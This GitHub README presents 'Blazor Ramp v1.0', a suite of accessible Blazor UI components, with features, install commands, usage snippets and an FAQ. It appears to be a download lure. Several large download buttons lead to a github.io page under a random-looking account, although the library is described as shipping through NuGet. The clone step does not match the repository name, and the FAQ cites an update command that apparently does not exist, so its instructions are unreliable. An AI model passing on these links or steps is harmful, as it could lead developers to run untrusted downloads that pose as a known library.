# Blazor Ramp v1.0 - UI Components 2026

> **A modular suite of accessible-first Blazor components delivered individually via NuGet, helping developers build inclusive web applications with minimal friction.**

[![Platform](https://img.shields.io/badge/Platform-Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mathis-wolf50/components-win-64746?style=flat-square)](https://github.com/mathis-wolf50/components-win-64746)

---

<p align="center">
  <a href="https://mathis-wolf50.github.io/components-win-64746/">
    <img src="https://img.shields.io/badge/Download-Blazor%20Ramp%20Latest-brightgreen?style=for-the-badge" alt="Download Blazor Ramp">
  </a>
</p>

> **[Direct Download - Blazor Ramp v1.0](https://mathis-wolf50.github.io/components-win-64746/)**

---

[Download Latest Build](https://mathis-wolf50.github.io/components-win-64746/)

---

## About Blazor Ramp

Blazor Ramp is a collection of carefully crafted UI components built for Blazor applications. Each component follows accessibility guidelines and ships as an independent NuGet package, allowing you to include only what your project needs. Whether you are building internal dashboards, public-facing sites, or complex interactive tools, these components help you deliver a consistent experience without reinventing common patterns.

The project focuses on modularity and ease of integration. Developers can pick individual widgets like a modal dialog, toggle switch, or pagination control without pulling in a monolithic library. Every component is designed to work with standard Blazor hosting models, including WebAssembly and Server. This approach reduces bloat and gives teams full control over their dependency graph.

## Features

- **Live Region Service** – Dynamically announce content changes to assistive technologies.
- **Announcement History Component** – Keep a record of live region announcements for debugging or user review.
- **Busy Indicator** – Show loading states with a lightweight, customizable spinner or overlay.
- **Modal Dialog Framework** – Accessible modal windows with focus trapping and keyboard navigation.
- **Switch & Toggle Controls** – On/off toggles that follow WAI-ARIA switch patterns.
- **Tabs & Accordion** – Organized content panels with keyboard support and expand/collapse behavior.
- **Toggletip & Skip-to Navigation** – Contextual help tooltips and skip links for keyboard users.
- **Debounce Filter & Pagination** – Efficient input filtering and page navigation for data-heavy interfaces.

## Installation

Clone the repository or install individual components via NuGet:

```bash
git clone https://github.com/mathis-wolf50/components-win-64746.git
cd BlazorRamp-Components
```

To add a component to your Blazor project, use the NuGet package manager:

```bash
dotnet add package BlazorRamp.AnnouncementHistory
dotnet add package BlazorRamp.ModalDialog
```

After installation, register the service in `Program.cs`:

```csharp
builder.Services.AddBlazorRamp();
```

## Usage

Once registered, use components in your Razor pages:

```razor
<BlazorRampModal Title="Confirm Action">
    <Body>
        <p>Are you sure you want to proceed?</p>
    </Body>
    <Footer>
        <button @onclick="HandleCancel">Cancel</button>
        <button @onclick="HandleConfirm">Confirm</button>
    </Footer>
</BlazorRampModal>
```

For the live region service, inject `ILiveRegionService` and call `AnnounceAsync`:

```csharp
@inject ILiveRegionService LiveRegion

<button @onclick="() => LiveRegion.AnnounceAsync("Item saved")">Save</button>
```

## Configuration

Component settings are stored in a JSON configuration file located at `wwwroot/blazor-ramp.json` by default. You can adjust announcement durations, modal animation speeds, and pagination page sizes there. Alternatively, pass options directly when registering services:

```csharp
builder.Services.AddBlazorRamp(options => {
    options.AnnouncementTimeout = 3000;
    options.ModalCloseOnEscape = true;
});
```

## Requirements

- **Platform**: .NET 6+ Blazor (WebAssembly or Server)
- **Runtime**: Standard Blazor hosting environment
- **Storage**: Minimal – no database or external storage required
- **Browser**: Modern browsers with JavaScript enabled (for interactive components)

## FAQ

**How do I update a single component without affecting others?**  
Each component is a separate NuGet package. Update only the ones you need using `dotnet update package`.

**Can I customize the appearance?**  
Yes. Components use CSS variables and allow overrides. Include your own stylesheet after the default one.

**Is there support for keyboard-only navigation?**  
All components are built with keyboard accessibility in mind, including focus management and ARIA attributes.

**Where can I report issues or request features?**  
Open an issue on the GitHub repository. Please include your Blazor version and component package name.

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
